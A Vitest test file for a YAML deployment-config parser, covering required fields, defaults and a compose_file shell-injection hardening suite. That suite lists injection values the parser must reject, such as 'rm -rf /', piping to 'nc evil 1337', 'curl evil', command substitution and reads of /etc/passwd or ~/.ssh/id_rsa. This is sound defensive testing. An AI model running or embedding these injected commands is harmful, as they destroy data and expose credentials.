import { describe, it, expect } from "vitest";
import { parseRelayConfig, RelayConfigError } from "./relay.js";

describe("parseRelayConfig", () => {
  it("parses minimal valid config", () => {
    const config = parseRelayConfig(`
name: my-app
health: /api/health
`);
    expect(config.name).toBe("my-app");
    expect(config.health).toBe("/api/health");
    expect(config.compose_file).toBe("docker-compose.yml");
    expect(config.command).toBeUndefined();
    expect(config.pre_update).toEqual([]);
    expect(config.post_update).toEqual([]);
    expect(config.rollback).toBe(true);
  });

  it("parses full config with all fields", () => {
    const config = parseRelayConfig(`
name: production-api
health: /health
compose_file: docker-compose.prod.yml
command: make deploy
pre_update:
  - make db-generate
  - npm run build
post_update:
  - docker compose exec backend npx prisma migrate deploy
rollback: false
`);
    expect(config.name).toBe("production-api");
    expect(config.health).toBe("/health");
    expect(config.compose_file).toBe("docker-compose.prod.yml");
    expect(config.command).toBe("make deploy");
    expect(config.pre_update).toEqual(["make db-generate", "npm run build"]);
    expect(config.post_update).toEqual([
      "docker compose exec backend npx prisma migrate deploy",
    ]);
    expect(config.rollback).toBe(false);
  });

  it("applies default values", () => {
    const config = parseRelayConfig(`
name: app
health: /up
`);
    expect(config.compose_file).toBe("docker-compose.yml");
    expect(config.rollback).toBe(true);
    expect(config.pre_update).toEqual([]);
    expect(config.post_update).toEqual([]);
  });

  it("rejects missing name", () => {
    expect(() =>
      parseRelayConfig(`
health: /api/health
`),
    ).toThrow(RelayConfigError);
  });

  it("rejects missing health", () => {
    expect(() =>
      parseRelayConfig(`
name: my-app
`),
    ).toThrow(RelayConfigError);
  });

  it("rejects empty name", () => {
    expect(() =>
      parseRelayConfig(`
name: ""
health: /health
`),
    ).toThrow(RelayConfigError);
  });

  it("rejects non-object YAML", () => {
    expect(() => parseRelayConfig("just a string")).toThrow(RelayConfigError);
  });

  it("rejects empty YAML", () => {
    expect(() => parseRelayConfig("")).toThrow(RelayConfigError);
  });

  it("provides clear error messages", () => {
    try {
      parseRelayConfig(`
health: /health
`);
      expect.unreachable("should have thrown");
    } catch (err) {
      expect(err).toBeInstanceOf(RelayConfigError);
      expect((err as RelayConfigError).message).toContain("name");
    }
  });

  it("supports custom command mode", () => {
    const config = parseRelayConfig(`
name: custom-deploy
health: /health
command: ./deploy.sh --production
`);
    expect(config.command).toBe("./deploy.sh --production");
  });

  describe("compose_file shell-injection hardening", () => {
    const validValues = [
      "docker-compose.yml",
      "docker-compose.prod.yml",
      "deploy/compose.yml",
      "compose.yaml",
      "infra/docker/compose.prod.yml",
      "a_b-c.0.1.yml",
    ];

    for (const value of validValues) {
      it(`accepts safe value: ${value}`, () => {
        const config = parseRelayConfig(`
name: app
health: /health
compose_file: ${value}
`);
        expect(config.compose_file).toBe(value);
      });
    }

    // Each entry exercises a distinct shell-injection or path-traversal
    // vector that the hardening must reject before the value reaches the
    // shell layer.
    const malicious: [string, string][] = [
      ["single quote", "docker-compose.yml'; rm -rf /#"],
      ["double quote", 'docker-compose.yml"; echo pwned'],
      ["semicolon", "docker-compose.yml; touch /tmp/x"],
      ["pipe", "docker-compose.yml | nc evil 1337"],
      ["backtick command sub", "docker-compose.yml`whoami`"],
      ["dollar command sub", "docker-compose.yml$(id)"],
      ["space", "docker-compose.yml extra"],
      ["newline", "docker-compose.yml\nrm -rf /"],
      ["null byte", "docker-compose.yml\u0000.evil"],
      ["parent dir traversal", "../../etc/passwd"],
      ["embedded parent dir", "deploy/../../etc/passwd"],
      ["ampersand", "docker-compose.yml & curl evil"],
      ["redirect", "docker-compose.yml > /tmp/x"],
      ["glob", "docker-compose.y*"],
      ["tilde", "~/.ssh/id_rsa"],
      ["absolute path", "/etc/passwd"],
      ["absolute compose path", "/var/lib/docker/compose.yml"],
      ["backslash", "deploy\\compose.yml"],
      ["leading whitespace", " docker-compose.yml"],
      ["trailing whitespace", "docker-compose.yml "],
      ["control char SOH", "docker-compose.yml\u0001evil"],
      ["empty string", ""],
    ];

    for (const [label, value] of malicious) {
      it(`rejects ${label}: ${JSON.stringify(value)}`, () => {
        // YAML-quoted so newlines / nulls / specials survive the load.
        const yaml = `name: app\nhealth: /health\ncompose_file: ${JSON.stringify(value)}\n`;
        expect(() => parseRelayConfig(yaml)).toThrow(RelayConfigError);
      });
    }

    it("error message points at compose_file", () => {
      try {
        parseRelayConfig(`
name: app
health: /health
compose_file: "evil; rm -rf /"
`);
        expect.unreachable("should have thrown");
      } catch (err) {
        expect(err).toBeInstanceOf(RelayConfigError);
        expect((err as RelayConfigError).message).toContain("compose_file");
      }
    });
  });
});
